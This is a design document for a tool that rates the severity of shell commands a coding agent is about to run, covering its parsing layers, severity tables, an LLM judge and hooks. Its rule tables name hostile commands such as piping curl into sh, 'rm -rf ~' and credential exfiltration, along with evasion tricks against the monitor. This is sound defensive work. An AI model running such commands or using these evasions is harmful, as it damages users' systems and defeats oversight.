# cmdsev — Command Severity Analyser for Coding Agents

**Final design and execution document** · Draft for review · As of 2026-11-07

> **Viewing the diagrams.** All UML diagrams are Mermaid code blocks. They render directly on GitHub, GitLab, and in VS Code's Markdown preview (with the *Markdown Preview Mermaid Support* extension), Obsidian, and Notion.

---

## Contents

1. [Summary](#1-summary)
2. [Goals, non-goals, success metrics](#2-goals-non-goals-success-metrics)
3. [Background: why not trace before execution](#3-background-why-not-trace-before-execution)
4. [Prior art](#4-prior-art)
5. [Requirements](#5-requirements)
6. [Architecture](#6-architecture)
7. [Runtime behaviour](#7-runtime-behaviour)
8. [Data model](#8-data-model)
9. [Effect and severity model](#9-effect-and-severity-model)
10. [Layer-by-layer design](#10-layer-by-layer-design)
11. [Combining static checks with ML](#11-combining-static-checks-with-ml)
12. [Interfaces and protocols](#12-interfaces-and-protocols)
13. [Storage](#13-storage)
14. [VS Code extension](#14-vs-code-extension)
15. [Rust implementation](#15-rust-implementation)
16. [Coverage strategy](#16-coverage-strategy)
17. [Accuracy and testing](#17-accuracy-and-testing)
18. [Performance engineering](#18-performance-engineering)
19. [Security and privacy of the analyser](#19-security-and-privacy-of-the-analyser)
20. [Failure modes](#20-failure-modes)
21. [Packaging and installation](#21-packaging-and-installation)
22. [Execution plan](#22-execution-plan)
23. [Observability](#23-observability)
24. [Risks and open questions](#24-risks-and-open-questions)
25. [Appendix](#25-appendix)

---

## 1. Summary

`cmdsev` is a Rust tool that rates every shell command a coding agent is about to run, in under 1 second, and shows the user the severity and the reason before the command runs. A VS Code extension keeps a per-conversation record of every command the agent ran.

**Core approach:** decide statically wherever possible, resolve one level deeper without executing, send only the leftovers to an LLM or ML model, and keep execution tracing out of the pre-execution path. Tracing is used offline for training labels, at runtime as sandbox enforcement, and after execution for the audit trail.

---

## 2. Goals, non-goals, success metrics

**Goals**

- Rate each command into a severity level (S0–S4 or UNKNOWN) with a human-readable reason.
- Map severity to allow / ask / deny through user policy.
- Combine the reliability of static rules with the flexibility of ML for commands rules don't cover.
- Keep p50 latency in single-digit milliseconds and p99 under 1 second.
- Give a per-conversation audit trail in VS Code.

**Non-goals**

- Replacing OS sandboxing. The analyser is a decision aid; a runtime sandbox remains the safety net.
- Stopping a determined attacker who fully controls the agent. The target is accidental and prompt-injected damage.
- Running commands speculatively to find out what they do.
- Windows support in v1 (macOS and Linux only).

**Success metrics**

| Metric | Target |
| --- | --- |
| S4 recall on adversarial set | 100% |
| S3+ recall on all test sets | ≥ 99% |
| False-ask rate on real transcripts | ≤ 5% |
| Static coverage (`Confidence::Full`) | ≥ 85% of commands |
| Static p99 latency | < 20 ms |
| End-to-end p99 latency (with LLM) | < 1 s |

---

## 3. Background: why not trace before execution

Tracing is the right goal but the wrong place: a trace only exists once the command runs, so pre-execution tracing means speculative execution in a sandbox.

| Problem | Why it hurts |
| --- | --- |
| Latency | `npm install`, `pytest` and `make` take seconds to minutes; the 1-second budget is impossible. |
| Side effects | `git push`, `curl -X POST` and `terraform apply` act on the outside world. Block the network and the trace diverges; allow it and the damage is done. |
| Divergence | Sandbox runs differ in time, randomness, state and prompts. Malicious code can detect the sandbox. |
| Level of detail | `DROP TABLE` is just `write()` to a socket; `rm -rf` is 10,000 `unlink` calls. Syscalls still need turning back into meaning. |
| macOS | dtrace is restricted by SIP; Endpoint Security needs Apple entitlements. strace and eBPF are Linux-only. |

**Where tracing is used instead**

1. **Offline training labels.** Run a command corpus in throwaway Linux containers under strace or eBPF and record real effects as ground truth.
2. **Runtime enforcement.** Run the real command inside a sandbox policy (no writes outside the workspace, allow-listed network), as Codex CLI and Claude Code's sandbox mode do.
3. **Post-execution audit.** Record what actually changed (git status before/after, file events) for the VS Code timeline.

**How we look under the hood before execution**

- **Static resolution of wrappers:** `npm run build` → the script in `package.json`; `./deploy.sh` → parse the file; `python x.py` → scan for dangerous calls.
- **Native dry-run modes:** `terraform plan`, `kubectl --dry-run=server`, `rsync -n`, `git clean -n`, `apt-get -s`, `helm --dry-run`. (`make -n` is *not* side-effect-free — see §10.3.)
- **Abstract interpretation of the shell:** expand variables, loops and functions while intercepting every command instead of running it (as `mvdan/sh/interp` or the brush shell interpreter allow).

---

## 4. Prior art

Each existing tool solves one slice; `cmdsev` combines their best ideas. This list is from memory, not freshly checked sources — verify current behaviour before relying on any detail.

| Project | What it does | What we take |
| --- | --- | --- |
| Claude Code | Splits bash into sub-commands for permission rules; sandbox mode; PreToolUse/PostToolUse hooks | Hook integration point; per-sub-command checks |
| OpenAI Codex CLI | Parses `bash -lc` with tree-sitter-bash; auto-approves only if every part is known-safe; Seatbelt/Landlock sandbox | All-parts-safe rule for S0 |
| GitHub Copilot (VS Code) | `chat.tools.terminal.autoApprove` regex allow/deny per sub-command | One bad part fails the line |
| OpenHands | SecurityAnalyzer with LOW/MEDIUM/HIGH risk; confirmation mode on high | Severity drives confirmation |
| Meta LlamaFirewall | AlignmentCheck: does the action match the user's goal? | Intent-mismatch check against the agent's `description` |
| Fig / Amazon Q specs | Structured subcommand and flag specs for hundreds of CLIs | Generate command spec skeletons |
| GTFOBins | Catalogue of ordinary binaries that can run code or read/write files | Checklist of hidden `exec` paths |
| Falco / Tracee | Runtime syscall rules | Effect vocabulary (persistence, credential access) |
| ShellCheck | Lints shell footguns, e.g. `rm -rf "$DIR/"` with empty `$DIR` | Pessimistic handling of unknown variables |

---

## 5. Requirements

### 5.1 Use cases

```mermaid
flowchart LR
    Dev(["Developer"])
    Agent(["Coding agent"])
    Maint(["cmdsev maintainer"])

    subgraph System["cmdsev"]
        UC1["Rate a command before it runs"]
        UC2["Show severity and reason in the agent UI"]
        UC3["Block or ask for risky commands"]
        UC4["Record command outcome"]
        UC5["Browse commands per conversation"]
        UC6["Give feedback on a rating"]
        UC7["Customise policy and overrides"]
        UC8["Export a session audit log"]
        UC9["Add or update command specs"]
        UC10["Retrain classifier from labels"]
    end

    Agent --> UC1
    Agent --> UC4
    UC1 --> UC2
    UC1 --> UC3
    Dev --> UC2
    Dev --> UC3
    Dev --> UC5
    Dev --> UC6
    Dev --> UC7
    Dev --> UC8
    Maint --> UC9
    Maint --> UC10
```

### 5.2 Functional requirements

| ID | Requirement |
| --- | --- |
| FR-1 | Analyse every Bash tool call before execution and return allow / ask / deny with a severity and reason. |
| FR-2 | Decompose compound commands (pipes, `&&`, `;`, subshells, substitutions, here-docs) and rate the whole by its most severe part and dangerous combinations. |
| FR-3 | Unwrap wrappers (`sudo`, `env`, `timeout`, `nohup`, `xargs`, `find -exec`, `bash -c`, `sh -c`) recursively. |
| FR-4 | Resolve one level into project scripts (`package.json` scripts, Makefile targets, `.sh`/`.py`/`.js` files) without executing them. |
| FR-5 | Adjust severity by context: path scope, git state, cloud and database targets. |
| FR-6 | Send commands the static layers can't decide to an LLM judge with a hard deadline. |
| FR-7 | Analyse Write/Edit tool calls on sensitive paths (shell rc files, CI workflows, credentials). |
| FR-8 | Record every decision and its execution outcome in a local store keyed by agent session. |
| FR-9 | VS Code extension: list sessions and commands, show details and reasons, accept feedback, export a session. |
| FR-10 | User policy: map severity to actions; add per-pattern overrides. |
| FR-11 | `cmdsev explain "<command>"` CLI for manual checks and debugging. |

### 5.3 Non-functional requirements

| ID | Requirement |
| --- | --- |
| NFR-1 | Static path p99 < 20 ms; end-to-end p99 < 1 s. |
| NFR-2 | Never return *allow* because of an internal error; errors produce *ask*. |
| NFR-3 | Static analysis works without the daemon or network. |
| NFR-4 | Never execute the analysed command or any script it references. |
| NFR-5 | Secrets are redacted before anything is stored or sent to the LLM. |
| NFR-6 | macOS (arm64, x86_64) and Linux (x86_64, arm64). |
| NFR-7 | Every verdict is explainable: rule IDs plus the exact span in the command. |
| NFR-8 | Deterministic: the same command and context give the same static verdict. |

---

## 6. Architecture

### 6.1 Component diagram

A command passes four static layers inside the hook binary; only commands the static layers can't decide confidently go to the daemon's classifier and LLM judge.

```mermaid
flowchart LR
    subgraph AgentBox["Coding agent"]
        TC["Bash / Write / Edit tool call"]
        AUI["Permission prompt UI"]
    end

    subgraph HookBox["cmdsev hook binary (spawned per call)"]
        L0["L0 Parse<br/>tree-sitter + brush"]
        L1["L1 Effects<br/>spec match, dataflow"]
        L2["L2 Resolve<br/>scripts, package.json"]
        L3["L3 Context<br/>paths, git, cloud"]
        SC["Score + policy"]
        SP["Spool writer<br/>(daemon down)"]
        L0 --> L1 --> L2 --> L3 --> SC
    end

    subgraph DaemonBox["cmdsev daemon (long-lived)"]
        IPC["IPC server<br/>Unix socket"]
        CACHE["Verdict and context caches"]
        L4["L4 Classifier<br/>ONNX"]
        L5["L5 LLM judge"]
        STW["Store writer"]
        EVS["Event stream"]
    end

    DB[("events.db<br/>SQLite WAL")]
    LLM["LLM API"]

    subgraph VSBox["VS Code extension"]
        TREE["Session tree"]
        DET["Detail view"]
        BAR["Status bar"]
        FB["Feedback actions"]
    end

    TC -->|"PreToolUse JSON"| L0
    SC -->|"decision + reason"| AUI
    SC -.->|"low confidence"| IPC
    IPC --> CACHE
    IPC --> L4
    L4 -.-> L5
    L5 -->|"HTTPS"| LLM
    IPC -.->|"verdict"| SC
    SC -->|"record event"| IPC
    SC -.-> SP
    IPC --> STW --> DB
    STW --> EVS
    EVS -->|"live events"| TREE
    TREE --> DET
    TREE --> BAR
    FB -->|"feedback"| IPC
```

### 6.2 Deployment diagram

```mermaid
flowchart TB
    subgraph Machine["Developer machine (macOS / Linux)"]
        subgraph Term["Terminal or IDE"]
            CC["Claude Code process"]
        end
        HK["cmdsev hook<br/>short-lived process"]
        subgraph Svc["launchd agent / systemd user unit"]
            DM["cmdsev daemon"]
        end
        subgraph VSC["VS Code"]
            EXT["Extension host<br/>cmdsev extension"]
        end
        subgraph Files["~/.cmdsev/"]
            CFG["config.toml"]
            DBF[("events.db")]
            SOCK["daemon.sock (0600)"]
            SPOOL["spool/*.jsonl"]
            USPEC["specs.d/*.toml (user)"]
        end
        PROJ["Project workspace<br/>(read only)"]
    end

    subgraph Cloud["External"]
        API["LLM API"]
    end

    subgraph CI["CI (Linux runners)"]
        HAR["Trace harness<br/>containers + strace/eBPF"]
        TRN["Classifier training"]
        GATE["Release gates"]
    end

    CC -->|"spawn, stdin/stdout"| HK
    HK -->|"connect"| SOCK
    SOCK --- DM
    HK -.->|"fallback append"| SPOOL
    HK -->|"read"| CFG
    HK -->|"read"| PROJ
    DM -->|"write"| DBF
    DM -->|"ingest at start"| SPOOL
    DM -->|"HTTPS, redacted"| API
    EXT -->|"subscribe, query"| SOCK
    HAR --> TRN --> GATE
```

### 6.3 Design decisions

| Decision | Choice | Why |
| --- | --- | --- |
| Where static analysis runs | In-process in the hook binary | Works without the daemon; no IPC on the hot path |
| Daemon role | Optional accelerator: caches, LLM, ML, store, event stream | A daemon crash loses extras, never safety checks |
| Shell parser | tree-sitter-bash primary, brush-parser cross-check | Error tolerance plus a second opinion against parser-differential bypasses |
| Spec storage | TOML in repo, compiled into the binary at build time | Zero startup parsing; specs reviewable as data |
| ML ordering | LLM judge first, local classifier later | Classifier needs ~10k labels to beat the LLM |
| Store | SQLite (WAL), owned by daemon | Concurrent readers, single writer, no server |
| VS Code access | Via daemon socket and `cmdsev query --json` | No native SQLite module in the extension host |

---

## 7. Runtime behaviour

### 7.1 Sequence: analysing a command (Claude Code)

```mermaid
sequenceDiagram
    autonumber
    actor Dev as Developer
    participant CC as Claude Code
    participant H as cmdsev hook
    participant D as cmdsev daemon
    participant L as LLM API
    participant DB as events.db
    participant X as VS Code extension

    CC->>H: PreToolUse JSON (command, description, cwd, session_id)
    H->>H: L0 to L3 static analysis, about 5 to 50 ms
    alt confidence is Full
        H->>H: score and apply policy
    else Partial, None or Opaque
        H->>D: judge request (IR, context, remaining deadline)
        D->>D: verdict cache lookup
        alt cache miss
            D->>L: structured judge request (redacted)
            L-->>D: effects JSON and intent check
            D->>D: cache result
        end
        D-->>H: judged effects
        H->>H: merge, severity can only rise
        Note over H,D: Timeout or no daemon gives UNKNOWN, which maps to ask
    end
    H->>D: record pre-event
    D->>DB: INSERT command row
    D-->>X: push event
    H-->>CC: permissionDecision and reason
    opt decision is ask
        CC->>Dev: show command, severity and reason
        Dev-->>CC: approve or reject
    end
    opt command allowed
        CC->>CC: run command, sandboxed if enabled
        CC->>H: PostToolUse JSON (result)
        H->>H: compute git status delta
        H->>D: record post-event
        D->>DB: UPDATE command row
        D-->>X: push event
    end
```

### 7.2 Activity: analysis pipeline

```mermaid
flowchart TD
    A(["Hook receives tool call"]) --> B{"Tool type?"}
    B -->|"Bash"| C["L0: parse with tree-sitter and brush"]
    B -->|"Write / Edit"| W["Path rules for sensitive files"]
    B -->|"Other"| Z["Record only, allow"]
    W --> S
    C --> D{"Parsers agree and no ERROR nodes?"}
    D -->|"no"| O["Mark Opaque"]
    D -->|"yes"| E["Normalise words, unwrap wrappers"]
    E --> F["L1: match specs, extract effects"]
    F --> G["Propagate taint across pipes and substitutions"]
    G --> H{"Runs a project script?"}
    H -->|"yes"| I["L2: resolve and analyse script, depth up to 4"]
    H -->|"no"| J["L3: context scoring"]
    I --> J
    J --> K{"Confidence Full?"}
    O --> M
    K -->|"yes"| S["Score: max effect severity, combos, policy"]
    K -->|"no"| M{"Daemon reachable and time left?"}
    M -->|"yes"| N["L4 classifier, then L5 LLM judge"]
    M -->|"no"| U["Severity UNKNOWN"]
    N --> P{"Answer within deadline?"}
    P -->|"yes"| Q["Merge judged effects, raise only"]
    P -->|"no"| U
    Q --> S
    U --> S
    S --> R["Emit decision and reasons"]
    R --> T["Record event (daemon or spool)"]
    T --> Y(["Return to agent"])
    Z --> T
```

### 7.3 State machine: command lifecycle

The hook never sees the user's answer to an *ask* directly; approval is inferred when a PostToolUse event arrives for the same call.

```mermaid
stateDiagram-v2
    [*] --> Received
    Received --> Parsed: L0 succeeds
    Received --> Opaque: parse error or parser disagreement
    Parsed --> EffectsExtracted: L1
    EffectsExtracted --> Resolved: L2
    Resolved --> Contextualised: L3
    Contextualised --> Scored: confidence Full
    Contextualised --> Judging: confidence Partial or None
    Opaque --> Judging
    Judging --> Scored: judged within deadline
    Judging --> Unknown: timeout or daemon down
    Unknown --> Scored
    Scored --> Allowed: policy allow
    Scored --> Asking: policy ask
    Scored --> Denied: policy deny
    Asking --> Allowed: PostToolUse arrives
    Asking --> Rejected: no PostToolUse within session
    Allowed --> Executing
    Executing --> Completed: PostToolUse recorded
    Denied --> [*]
    Rejected --> [*]
    Completed --> [*]
```

### 7.4 State machine: hook to daemon connection

```mermaid
stateDiagram-v2
    [*] --> Connecting
    Connecting --> Connected: socket accepts within 20 ms
    Connecting --> StaticOnly: refused or timeout
    Connected --> Requesting: judge or record
    Requesting --> Connected: reply within deadline
    Requesting --> StaticOnly: deadline exceeded
    StaticOnly --> Spooling: event to record
    Spooling --> [*]
    Connected --> [*]: hook exits
```

---

## 8. Data model

### 8.1 Class diagram: command IR and verdict types

```mermaid
classDiagram
    direction TB

    class AnalyzeRequest {
        +String command
        +Option~String~ description
        +PathBuf cwd
        +String session_id
        +Option~String~ tool_use_id
        +AgentKind agent
        +ShellKind shell
        +ToolKind tool
    }

    class CommandIR {
        +Node root
        +ParserAgreement agreement
        +Vec~Span~ opaque_spans
    }

    class Node {
        <<enumeration>>
        Simple
        Pipeline
        And
        Or
        Seq
        Subshell
        Substitution
        Opaque
    }

    class SimpleCmd {
        +Word program
        +Vec~Word~ args
        +Vec~EnvAssign~ env
        +Vec~Redirect~ redirects
        +Vec~Wrapper~ wrappers
        +Span span
    }

    class Word {
        <<enumeration>>
        Literal
        Glob
        Partial
        Unknown
    }

    class Verdict {
        +Severity severity
        +Confidence confidence
        +Vec~Effect~ effects
        +Vec~Reason~ reasons
        +LayerId decided_by
        +Decision decision
        +u64 latency_us
    }

    class Effect {
        +EffectKind kind
        +Option~Target~ target
        +Scope scope
        +bool recursive
        +Span span
        +Attrs attrs
    }

    class Reason {
        +String rule_id
        +Span span
        +String text
    }

    class Severity {
        <<enumeration>>
        S0
        S1
        S2
        S3
        S4
        Unknown
    }

    class Confidence {
        <<enumeration>>
        Full
        Partial
        None
    }

    AnalyzeRequest ..> CommandIR : parsed into
    CommandIR *-- Node : root
    Node *-- SimpleCmd : Simple variant
    SimpleCmd *-- Word : program and args
    CommandIR ..> Verdict : analysed into
    Verdict *-- Effect : effects
    Verdict *-- Reason : reasons
    Verdict --> Severity
    Verdict --> Confidence
```

### 8.2 Class diagram: analyser and layers

```mermaid
classDiagram
    direction TB

    class Analyzer {
        +Vec~LayerBox~ layers
        +SpecDb specs
        +Policy policy
        +analyze(req) Verdict
    }

    class Layer {
        <<interface>>
        +id() LayerId
        +run(state, deadline) LayerOutcome
    }

    class Judge {
        <<interface>>
        +judge(ir, ctx, deadline) Result~JudgeOutput~
    }

    class ParseLayer {
        +TreeSitterParser primary
        +BrushParser crosscheck
    }
    class EffectsLayer {
        +SpecDb specs
    }
    class ResolveLayer {
        +ScriptCache cache
        +u8 max_depth
    }
    class ContextLayer {
        +ContextCache cache
    }
    class DaemonJudge {
        +SocketPath socket
    }

    class SpecDb {
        +lookup(program) Option~Spec~
    }

    class Policy {
        +Vec~Override~ overrides
        +action_for(severity) Decision
    }

    class Context {
        +PathBuf workspace_root
        +GitState git
        +CloudContext cloud
        +ShellKind shell
    }

    Analyzer o-- Layer : runs in order
    Analyzer --> Judge : when confidence below Full
    Analyzer --> Policy : maps severity
    Layer <|.. ParseLayer
    Layer <|.. EffectsLayer
    Layer <|.. ResolveLayer
    Layer <|.. ContextLayer
    Judge <|.. DaemonJudge
    EffectsLayer --> SpecDb
    ContextLayer ..> Context : builds
```

### 8.3 Key Rust types

```rust
pub enum Word {
    Literal(String),                              // fully known
    Glob(String),                                 // known pattern, unknown matches
    Partial { known: String, holes: Vec<Hole> },  // "$DIR/build"
    Unknown(Hole),                                // $(...), unresolved $VAR
}

pub struct SimpleCmd {
    pub program: Word,
    pub args: Vec<Word>,
    pub env: Vec<EnvAssign>,       // PATH, LD_PRELOAD, GIT_SSH_COMMAND, ...
    pub redirects: Vec<Redirect>,
    pub wrappers: Vec<Wrapper>,    // sudo, env, timeout, nohup, xargs, find -exec
    pub span: Span,
}

pub enum Node {
    Simple(SimpleCmd),
    Pipeline(Vec<Node>),
    And(Box<Node>, Box<Node>),
    Or(Box<Node>, Box<Node>),
    Seq(Vec<Node>),
    Subshell(Box<Node>),
    Substitution(Box<Node>),
    Opaque { reason: OpaqueReason, span: Span },
}

pub enum Confidence { Full, Partial, None }

pub enum Severity { S0, S1, S2, S3, S4, Unknown }

pub struct Verdict {
    pub severity: Severity,
    pub confidence: Confidence,
    pub effects: Vec<Effect>,
    pub reasons: Vec<Reason>,
    pub decided_by: LayerId,
    pub decision: Decision,      // Allow | Ask | Deny
    pub latency_us: u64,
}

pub trait Layer: Send + Sync {
    fn id(&self) -> LayerId;
    fn run(&self, state: &mut AnalysisState, deadline: Deadline) -> LayerOutcome;
}

pub trait Judge: Send + Sync {
    fn judge(&self, ir: &CommandIR, ctx: &Context, deadline: Deadline)
        -> Result<JudgeOutput, JudgeError>;
}
```

`Severity::Unknown` sorts above S2 for policy purposes: it is never auto-allowed.

---

## 9. Effect and severity model

We classify what a command does as typed effects, then derive severity from effects plus context.

```json
{"effects": [
  {"kind": "fs.delete", "recursive": true, "target": "./src", "scope": "workspace", "git_tracked": true},
  {"kind": "net.egress", "host": "api.example.com", "method": "POST"}
]}
```

### 9.1 Effect types

| Effect | Base severity | Examples |
| --- | --- | --- |
| `fs.read` | S0 | `cat`, `ls`, `grep` |
| `fs.write` | S1 (scope-adjusted) | `>`, `tee`, `sed -i` |
| `fs.delete` | S1–S4 (scope-adjusted) | `rm`, `find -delete`, `git clean` |
| `net.egress` | S2 | `curl`, `wget`, `git fetch` |
| `net.listen` | S2 | `nc -l`, `python -m http.server` |
| `exec.remote_code` | S4 | `curl … \| sh`, `npx unknown-pkg` |
| `priv.escalate` | S4 | `sudo`, `chmod u+s`, `doas` |
| `proc.kill` | S2–S3 | `kill -9`, `pkill`, `killall` |
| `vcs.remote_write` | S3 | `git push` |
| `vcs.history_rewrite` | S3–S4 | `git push --force`, `git reset --hard` |
| `pkg.install` | S2 | `npm install`, `pip install` (install scripts run) |
| `cred.access` | S3 | `~/.ssh`, `~/.aws`, `.env`, keychain |
| `persist` | S3 | crontab, launchctl, shell rc files |
| `cloud.mutate` | S3 (S4 on prod) | `kubectl delete`, `terraform apply`, `aws s3 rm` |
| `db.mutate` | S3 (S4 on prod) | `psql -c "DROP …"` |
| `exec.opaque` | Unknown | `eval`, decoded payloads, variable in command position |

### 9.2 Context modifiers

- **Path scope:** `WorkspaceTracked` (recoverable via git) < `WorkspaceUntracked` < `Home` < `System` < `Root`.
- **Git state:** uncommitted changes make `reset --hard` destructive; the default branch makes `push --force` critical.
- **Live context:** kube context or `AWS_PROFILE` matching a prod marker; `DATABASE_URL` on a non-local host.

**Scope matrix for `fs.delete` and `fs.write`**

| Scope | `fs.write` | `fs.delete` | `fs.delete` recursive |
| --- | --- | --- | --- |
| WorkspaceTracked | S1 | S1 | S2 |
| WorkspaceUntracked | S1 | S2 | S3 |
| Home | S2 | S3 | S4 |
| System | S3 | S4 | S4 |
| Root | S4 | S4 | S4 |

Known regenerable folders inside the workspace (`node_modules`, `target`, `dist`, `build`, `.venv`, `__pycache__`) lower a delete by one level, so `rm -rf node_modules` is S2, not S3.

### 9.3 Combination rules

| Rule ID | Pattern | Result |
| --- | --- | --- |
| `combo.remote_exec` | `net.egress` output → shell stdin or `$(…)` in command position | S4 |
| `combo.exfil` | `cred.access` output → `net.egress` | S4 |
| `combo.decode_exec` | `base64 -d` / `xxd -r` output → shell | S4 |
| `combo.write_then_exec` | script written earlier in session, then executed | analyse script; at least S2 |
| `combo.chmod_exec` | `chmod +x` on downloaded file, then run | S4 |

### 9.4 Severity levels

| Level | Meaning | Examples | Default action |
| --- | --- | --- | --- |
| S0 Info | Read-only | `ls`, `git status`, `cat src/x.ts` | allow |
| S1 Low | Local, reversible, in workspace | edit tracked files, `npm test` | allow |
| S2 Medium | Wider local impact or network reads | `npm install`, write untracked files, `curl` GET | allow + notify |
| S3 High | Irreversible or external side effects | `git push`, `rm -rf` untracked data, `kubectl apply` | ask |
| S4 Critical | Privilege escalation, remote code, credential leak, system-wide damage | `curl … \| sh`, `sudo`, `rm -rf ~` | deny (open question, §24) |
| UNKNOWN | Couldn't determine | opaque `eval`, unknown binary, LLM timeout | ask |

Every verdict carries a reason, e.g.:

```
S3 HIGH · deletes 1,204 untracked files in ./data (not recoverable) · rule fs.delete.recursive
```

---

## 10. Layer-by-layer design

| Layer | Input | Output | Budget | On failure |
| --- | --- | --- | --- | --- |
| L0 Parse | raw string, shell kind | `CommandIR` | 1–5 ms | `Opaque` node |
| L1 Effects | IR, spec DB | effects + per-node confidence | 1–5 ms | effect `unknown`, confidence Partial |
| L2 Resolve | IR, workspace files | effects of referenced scripts | 5–50 ms (cached) | confidence Partial |
| L3 Context | effects, cwd | scoped effects | 5–20 ms (cached) | assume worst scope |
| L4 Classifier | IR features | severity + probability | 5–30 ms | skip to L5 |
| L5 LLM judge | IR, scripts, context, description | effects JSON + intent match | ≤ 800 ms | UNKNOWN |

### 10.1 L0 — Parse and normalise

- Parse with tree-sitter-bash and brush-parser. Compare structure (number of simple commands, program words, operators). Any disagreement or any tree-sitter `ERROR` node → `Opaque`.
- Decompose pipelines, `&&` / `||` / `;`, subshells, `$(…)`, backticks, redirects, here-docs, process substitution `<(…)`.
- Normalise evasions: `\rm`, `command rm`, `builtin`, `r''m`, `"r"m`, `$'\x72m'`, `${IFS}`, brace expansion of program names.
- Expand known variables only when assigned literally earlier in the same command line; otherwise keep `Partial` / `Unknown`.
- Unwrap wrappers recursively; `bash -c "<str>"` / `sh -c` / `zsh -c` re-parse the string with depth limit 4.
- **Shell awareness:** zsh doesn't word-split unquoted variables, expands `=cmd`, and supports glob qualifiers like `*(e:'…':)` that run code. Zsh-only constructs we can't model → `Opaque`.

### 10.2 L1 — Effects

- Look up the program in the spec DB (built-in specs plus `~/.cmdsev/specs.d/`).
- Parse argv using the spec's flag definitions (which flags take values, combined short flags, `--` terminator).
- Assign effects from subcommand and flags; any unknown flag lowers confidence to Partial.
- Env effects: `PATH`, `LD_PRELOAD`, `DYLD_*`, `GIT_SSH_COMMAND`, `PAGER`, `EDITOR`, `BASH_ENV`, `PROMPT_COMMAND` → `exec.opaque` or explicit exec effects.
- Dataflow: label each node's stdout with taint (`network`, `credential`, `decoded`); propagate through pipes and substitutions; apply combination rules (§9.3).
- Unknown program not in workspace and not in spec DB → confidence None.

### 10.3 L2 — Static resolution

| Invocation | Resolution |
| --- | --- |
| `npm run X`, `yarn X`, `pnpm X` | Script `X` plus `preX` / `postX` from `package.json`; re-parse as shell |
| `npm install`, `pip install` | `pkg.install`; check lockfile changes; flag new packages |
| `make T` | Parse the Makefile directly for target `T` and its recipe lines. Do **not** run `make -n`: it still runs `$(shell …)` and `+` lines |
| `./x.sh`, `bash x.sh` | Parse the file as shell |
| `python x.py`, `node x.js`, `ts-node x.ts` | tree-sitter scan for sinks: `subprocess`, `os.system`, `shutil.rmtree`, `requests.post`, `child_process`, `fs.rm`, `fetch` |
| `npx pkg`, `uvx pkg`, `pipx run pkg` | `exec.remote_code` unless the package is in the workspace lockfile |

Rules: read files at hook time (catches write-then-exec), cap file size at 1 MB, cap recursion depth at 4, cache results by blake3 content hash.

### 10.4 L3 — Context

- Canonicalise target paths (resolve `..` and existing symlinks; lexical resolution for paths that don't exist yet).
- Classify scope; check git tracking by reading the index (no subprocess).
- Read git state: dirty files, current branch, default branch of the remote.
- Read cloud context: current kube context, `AWS_PROFILE`, `GOOGLE_CLOUD_PROJECT`, `DATABASE_URL` host. Match against `prod_markers` in config.
- Cache context per workspace in the daemon with a ~2 s TTL; the hook computes it directly if the daemon is down.

### 10.5 Scoring

1. Severity = maximum over effects of base severity after scope modifiers.
2. Apply combination rules.
3. Apply user overrides (they can lower severity only for patterns the user wrote explicitly, and never for S4 combos).
4. Map severity to decision by policy.
5. Emit `Reason { rule_id, span, text }` for every contributing effect.

---

## 11. Combining static checks with ML

Static rules set a floor that ML can raise but never lower; ML only sees what the rules could not decide.

1. **Static verdicts are a floor.** A model must never talk the system out of `rm -rf ~`.
2. **Static S0 short-circuits.** A fully parsed command whose every part is allow-listed stops immediately — an estimated 70–85% of agent commands.
3. **UNKNOWN is a first-class result.** Unknown binaries, opaque constructs and unusual flags go to the ML layers.
4. **LLM judge (first).** A small fast model (e.g. `claude-haiku-5-5`) receives the IR, resolved scripts, context and the agent's `description`. It answers: what does this do, and does it match the stated intent? It returns JSON in the **same effect vocabulary**, so its output goes through the same scorer. Hard deadline 800 ms; timeout → UNKNOWN → ask.
5. **Local classifier (later).** Built only after ~10k labelled examples exist. Gradient-boosted trees on IR features (paths normalised to `<WS_PATH>`, `<HOME_PATH>`, `<URL>`), exported to ONNX. It answers common unknowns cheaply so fewer calls reach the LLM.
6. **Training loop.** Labels come from the rule engine, LLM-judge outputs, the offline trace harness and VS Code feedback; stable patterns are promoted into rules.

### 11.1 Training and feedback loop

```mermaid
flowchart LR
    T["Claude Code transcripts"] --> M["cmdsev mine"]
    TL["tldr examples"] --> CORP
    ADV["Adversarial generator<br/>+ GTFOBins"] --> CORP
    M --> CORP[("Corpus")]
    CORP --> LLMLAB["LLM-proposed labels"]
    LLMLAB --> REV["Human review"]
    CORP --> HAR["Trace harness<br/>Linux containers"]
    HAR --> GT["Ground-truth effects"]
    REV --> GOLD[("Golden labels")]
    GT --> GOLD
    FBK["VS Code feedback"] --> REV
    GOLD --> TRAIN["Train classifier"]
    TRAIN --> ONNX["ONNX model"]
    ONNX --> SHIP["Ship with daemon"]
    GOLD --> RULES["Promote stable patterns to specs"]
    GOLD --> GATES["CI release gates"]
```

---

## 12. Interfaces and protocols

### 12.1 Claude Code hook configuration

`cmdsev install claude` writes this into `~/.claude/settings.json` (after showing the diff and backing up the file):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|Write|Edit|MultiEdit",
        "hooks": [{ "type": "command", "command": "cmdsev hook claude pre", "timeout": 5 }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "cmdsev hook claude post", "timeout": 5 }]
      }
    ]
  }
}
```

**Input (stdin, PreToolUse):** `session_id`, `transcript_path`, `cwd`, `hook_event_name`, `tool_name`, `tool_input.command`, `tool_input.description`.

**Output (stdout):**

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "ask",
    "permissionDecisionReason": "S3 HIGH · force-pushes to main · rule vcs.history_rewrite"
  }
}
```

`allow` is emitted only for policy-allowed severities. Pre and post events are correlated by `tool_use_id` when present, else by `(session_id, command hash, most recent unmatched pre-event)`.

### 12.2 Daemon IPC protocol

JSON lines over `~/.cmdsev/daemon.sock` (mode 0600). Every message carries `v` (protocol version) and `id`.

| Method | Request | Response |
| --- | --- | --- |
| `hello` | `{client, version}` | `{server_version, protocol}` |
| `judge` | `{ir, context, description, deadline_ms}` | `{effects, intent_match, model, cached}` or `{error}` |
| `record` | `{event: pre\|post, payload}` | `{ok, command_id}` |
| `subscribe` | `{filter: {session_id?, min_severity?}}` | stream of `{event}` |
| `query` | `{session_id?, since?, limit}` | `{sessions, commands}` |
| `feedback` | `{command_id, kind: over\|under, severity?, note?}` | `{ok}` |
| `stats` | `{}` | coverage, layer mix, latency histograms |

```json
{"v":1,"id":"01JC9X…","method":"judge","params":{"deadline_ms":640,"description":"Clean build output","ir":{…},"context":{…}}}
```

### 12.3 LLM judge contract

